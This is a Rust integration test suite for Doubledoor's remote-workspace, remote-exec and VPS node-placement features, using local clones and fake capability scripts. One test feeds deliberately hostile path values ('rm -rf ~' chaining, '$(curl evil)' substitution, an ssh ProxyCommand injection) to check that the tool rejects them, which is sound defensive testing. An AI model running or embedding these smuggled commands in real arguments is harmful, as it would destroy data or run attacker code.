//! Phase VII (§51), items 1–6, investigated and implemented sequentially:
//! remote workspaces, Dream VPS coordination, distributed Locksmith leases,
//! remote GhostDiff transport, multi-host actor identity, and signed
//! mutation provenance — each gated on clean local recovery.
//!
//! "Remote hosts" here are clones served by their own Doubledoor, reached
//! either directly or through a transport prefix (`/usr/bin/env` stands in
//! for `ssh host`: same argv shape, no network).

#[path = "../integration/common/mod.rs"]
mod common;

use std::fs;
use std::path::{Path, PathBuf};

use common::*;
use serde_json::{json, Value};

fn bin() -> String {
    doubledoor_bin().to_string_lossy().into_owned()
}

/// Canonical repo A plus a clone B registered as remote `vps` (optionally
/// through a transport prefix).
struct World {
    a: Fixture,
    b_dir: tempfile::TempDir,
}

impl World {
    fn new(via: &[&str]) -> Self {
        let a = Fixture::new();
        fs::write(
            a.root().join(".git/info/exclude"),
            "notice-*.json\nlease*.json\n",
        )
        .unwrap();
        let b_dir = tempfile::tempdir().unwrap();
        git(
            b_dir.path(),
            &["clone", "-q", a.root().to_str().unwrap(), "b"],
        );
        let b = b_dir.path().join("b");
        git(&b, &["config", "user.email", "b@doubledoor.dev"]);
        git(&b, &["config", "user.name", "Remote B"]);
        let w = World { a, b_dir };
        let bpath = w.b();
        let mut args = vec![
            "remote",
            "add",
            "vps",
            "--path",
            bpath.to_str().unwrap(),
            "--doubledoor",
        ];
        let b = bin();
        args.push(&b);
        for v in via {
            args.push("--via");
            args.push(v);
        }
        dd(w.a(), &args);
        w
    }
    fn a(&self) -> &Path {
        self.a.root()
    }
    fn b(&self) -> PathBuf {
        self.b_dir.path().join("b")
    }
}

fn json_of(out: std::process::Output) -> (Option<i32>, Value, Value) {
    let stdout = serde_json::from_slice(&out.stdout).unwrap_or(Value::Null);
    let stderr = serde_json::from_slice(&out.stderr).unwrap_or(Value::Null);
    (out.status.code(), stdout, stderr)
}

fn open_remote(w: &World, extra: &[&str]) -> (Option<i32>, Value, Value) {
    let head = git(w.a(), &["rev-parse", "HEAD"]);
    let notice = write_notice(w.a(), "beta", "agent-alpha", "alpha.txt", &head);
    let mut args = vec![
        "open",
        "--remote",
        "vps",
        "--actor",
        "agent-beta",
        "--intent",
        "remote work",
        "--surface",
        "alpha.txt",
        "--notice",
        notice.to_str().unwrap(),
        "--format",
        "json",
    ];
    args.extend_from_slice(extra);
    json_of(doubledoor(w.a(), &args))
}

/// Leave a session looking interrupted (RECONCILING, no lock held).
fn interrupt_a_session(repo: &Path) {
    use doubledoor_core::{DoorSessionId, DoorState};
    use doubledoor_journal::{
        load_metadata, save_metadata, Journal, JournalEventKind, JournalRecord,
    };
    let s = open_session(repo, "agent-gamma", "x", "beta.txt", "agent-alpha");
    let dir = repo.join(".doubledoor/sessions").join(s.id.to_string());
    let mut m = load_metadata(&dir).unwrap();
    Journal::open(&dir)
        .unwrap()
        .append(JournalRecord {
            session: DoorSessionId::parse(&s.id.to_string()).unwrap(),
            at: std::time::SystemTime::now(),
            from: m.state,
            to: DoorState::Reconciling,
            event: JournalEventKind::RecoveryPerformed {
                action: "test: simulated crash".into(),
            },
        })
        .unwrap();
    m.state = DoorState::Reconciling;
    save_metadata(&dir, &m).unwrap();
}

// ---------------------------------------------------------------------------
// Item 1 — remote workspaces
// ---------------------------------------------------------------------------

#[test]
fn item1_sessions_are_hosted_on_a_remote_doubledoor() {
    for via in [&[][..], &["/usr/bin/env"][..]] {
        let w = World::new(via);
        let ping: Value =
            serde_json::from_str(&dd(w.a(), &["remote", "ping", "vps", "--format", "json"]))
                .unwrap();
        assert_eq!(ping["protocol"], "doubledoor.protocol/v1");
        assert_eq!(ping["in_sync"], true, "{ping:#}");
        assert_eq!(ping["recovery_ready"], true);

        let (code, s, err) = open_remote(&w, &[]);
        assert_eq!(code, Some(0), "{err:#}");
        assert_eq!(s["remote"], "vps");
        let id = s["id"].as_str().unwrap().to_string();
        let ws = PathBuf::from(s["workspace"].as_str().unwrap());
        assert!(
            ws.starts_with(w.b()),
            "the workspace lives on the remote host"
        );
        assert!(ws.join("alpha.txt").exists());
        // The session belongs to the remote; this host keeps only a link.
        assert!(sessions(w.a()).is_empty());
        assert_eq!(sessions(&w.b()).len(), 1);
        assert!(w
            .a()
            .join(".doubledoor/remote-sessions")
            .join(format!("{id}.json"))
            .is_file());

        // Any protocol method can be forwarded.
        let g: Value = serde_json::from_str(&dd(
            w.a(),
            &[
                "remote",
                "exec",
                "vps",
                "ghosts",
                "--params",
                &json!({"session": id}).to_string(),
                "--format",
                "json",
            ],
        ))
        .unwrap();
        assert!(g.as_array().unwrap().is_empty());
        let linked: Value =
            serde_json::from_str(&dd(w.a(), &["remote", "sessions", "--format", "json"])).unwrap();
        assert_eq!(linked[0]["live"]["state"], "Active");
        // Remote errors keep their structured contract.
        let (code, _, err) = json_of(doubledoor(
            w.a(),
            &[
                "remote",
                "exec",
                "vps",
                "inspect",
                "--params",
                r#"{"session":"dd_00000000-0000-0000-0000-000000000000"}"#,
                "--format",
                "json",
            ],
        ));
        assert_eq!(code, Some(5));
        assert_eq!(err["error"]["kind"], "not_found");
    }
}

#[test]
fn item1_remote_must_share_canonical_state() {
    let w = World::new(&[]);
    fs::write(w.a().join("alpha.txt"), "advanced\n").unwrap();
    git(w.a(), &["commit", "-qam", "A2"]);
    let (code, _, err) = open_remote(&w, &[]);
    assert_eq!(code, Some(6));
    assert!(
        err["error"]["message"]
            .as_str()
            .unwrap()
            .contains("remote sync"),
        "{err:#}"
    );
}

#[test]
fn item0_distributed_operation_waits_for_clean_local_recovery() {
    // Local problem → refused here, and doctor fails.
    let w = World::new(&[]);
    interrupt_a_session(w.a());
    let (code, _, err) = open_remote(&w, &[]);
    assert_eq!(code, Some(6));
    assert!(
        err["error"]["message"].as_str().unwrap().contains("§51"),
        "{err:#}"
    );
    let (_, doctor, _) = json_of(doubledoor(w.a(), &["doctor", "--format", "json"]));
    let check = doctor["checks"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["name"] == "local-recovery-ready")
        .unwrap()
        .clone();
    assert_eq!(check["ok"], false);
    // `recover` makes it ready again.
    dd(w.a(), &["recover"]);
    let (code, _, err) = open_remote(&w, &[]);
    assert_eq!(code, Some(0), "{err:#}");

    // Remote problem → refused too.
    let w = World::new(&[]);
    interrupt_a_session(&w.b());
    let (code, _, err) = open_remote(&w, &[]);
    assert_eq!(code, Some(6));
    assert!(
        err["error"]["message"]
            .as_str()
            .unwrap()
            .contains("remote is not recovery-clean"),
        "{err:#}"
    );
}

#[test]
fn item1_remote_configuration_cannot_smuggle_shell() {
    let w = World::new(&[]);
    for bad in ["/tmp/x; rm -rf ~", "$(curl evil)", "-oProxyCommand=sh"] {
        let out = doubledoor(w.a(), &["remote", "add", "evil", "--path", bad]);
        assert_eq!(out.status.code(), Some(1), "{bad}");
    }
    assert_eq!(
        doubledoor(w.a(), &["remote", "add", "bad name", "--path", "/x"])
            .status
            .code(),
        Some(1)
    );
}

// ---------------------------------------------------------------------------
// Item 2 — Dream VPS coordination
// ---------------------------------------------------------------------------

/// A fake `dreamseq-node` printing a NodeCapabilities report.
fn node_agent(dir: &Path, name: &str, vcpus: u32, harnesses: &[&str]) -> String {
    let p = dir.join(name);
    let report = json!({
        "architecture": "x86_64", "vcpus": vcpus, "memory_mb": 4096, "os": "linux",
        "ssh": true, "git": true, "ollama": false, "harnesses": harnesses,
    });
    fs::write(
        &p,
        format!("#!/bin/sh\n[ \"$1\" = capabilities ] || exit 2\necho '{report}'\n"),
    )
    .unwrap();
    std::process::Command::new("chmod")
        .args(["+x", p.to_str().unwrap()])
        .status()
        .unwrap();
    p.to_string_lossy().into_owned()
}

fn add_clone(w: &World, name: &str) -> PathBuf {
    let path = w.b_dir.path().join(name);
    git(
        w.b_dir.path(),
        &["clone", "-q", w.a().to_str().unwrap(), name],
    );
    git(&path, &["config", "user.email", "n@doubledoor.dev"]);
    git(&path, &["config", "user.name", "Node"]);
    dd(
        w.a(),
        &[
            "remote",
            "add",
            name,
            "--path",
            path.to_str().unwrap(),
            "--doubledoor",
            &bin(),
        ],
    );
    path
}

#[test]
fn item2_sessions_are_placed_on_suitable_dream_vps_nodes() {
    let w = World::new(&[]); // `vps`: registered but never probed
    let agents = tempfile::tempdir().unwrap();
    let small = add_clone(&w, "small");
    add_clone(&w, "big");
    dd(
        w.a(),
        &[
            "remote",
            "probe",
            "small",
            "--agent",
            &node_agent(agents.path(), "a1", 2, &[]),
        ],
    );
    let probe: Value = serde_json::from_str(&dd(
        w.a(),
        &[
            "remote",
            "probe",
            "big",
            "--agent",
            &node_agent(agents.path(), "a2", 8, &["fract"]),
            "--format",
            "json",
        ],
    ))
    .unwrap();
    assert_eq!(probe["node"]["capabilities"]["vcpus"], 8);
    assert_eq!(
        probe["node"]["doubledoor_version"]
            .as_str()
            .unwrap()
            .split(' ')
            .next(),
        Some("doubledoor")
    );

    // Most capacity wins; unprobed nodes are excluded with a reason.
    let head = git(w.a(), &["rev-parse", "HEAD"]);
    let notice = write_notice(w.a(), "beta", "agent-alpha", "alpha.txt", &head);
    let open = |extra: &[&str]| {
        let mut args = vec![
            "open",
            "--remote",
            "auto",
            "--actor",
            "agent-beta",
            "--intent",
            "x",
            "--surface",
            "alpha.txt",
            "--notice",
            notice.to_str().unwrap(),
            "--format",
            "json",
        ];
        args.extend_from_slice(extra);
        json_of(doubledoor(w.a(), &args))
    };
    let (code, s, err) = open(&[]);
    assert_eq!(code, Some(0), "{err:#}");
    assert_eq!(s["remote"], "big");
    assert!(
        s["placement"]["excluded"]
            .to_string()
            .contains("never probed"),
        "{:#}",
        s["placement"]
    );

    // Load per vCPU: an idle 2-vCPU node (0/2) beats a busy 8-vCPU one (1/8).
    let (_, s, _) = open(&[]);
    assert_eq!(
        s["remote"], "small",
        "an idle small node beats a busy big one"
    );

    // Harness requirements filter.
    let (_, s, _) = open(&["--require-harness", "fract"]);
    assert_eq!(s["remote"], "big");
    let (code, _, err) = open(&["--require-harness", "kaptaind"]);
    assert_eq!(code, Some(6));
    assert!(
        err["error"]["message"]
            .as_str()
            .unwrap()
            .contains("lacks harness `kaptaind`"),
        "{err:#}"
    );

    // A node that is not recovery-clean is never chosen.
    interrupt_a_session(&small);
    let (_, s, _) = open(&[]);
    assert_eq!(s["remote"], "big");
    assert!(s["placement"]["excluded"]
        .to_string()
        .contains("not recovery-clean"));

    // Malformed agent output fails the probe, never records guesses.
    let bad = agents.path().join("bad");
    fs::write(&bad, "#!/bin/sh\necho 'I am a node'\n").unwrap();
    std::process::Command::new("chmod")
        .args(["+x", bad.to_str().unwrap()])
        .status()
        .unwrap();
    let out = doubledoor(
        w.a(),
        &["remote", "probe", "vps", "--agent", bad.to_str().unwrap()],
    );
    assert_eq!(out.status.code(), Some(8));
    let cfg: Value = serde_json::from_str(&read(&w.a().join(".doubledoor/remotes.json"))).unwrap();
    assert!(cfg["remotes"]["vps"]["node"].is_null());
}
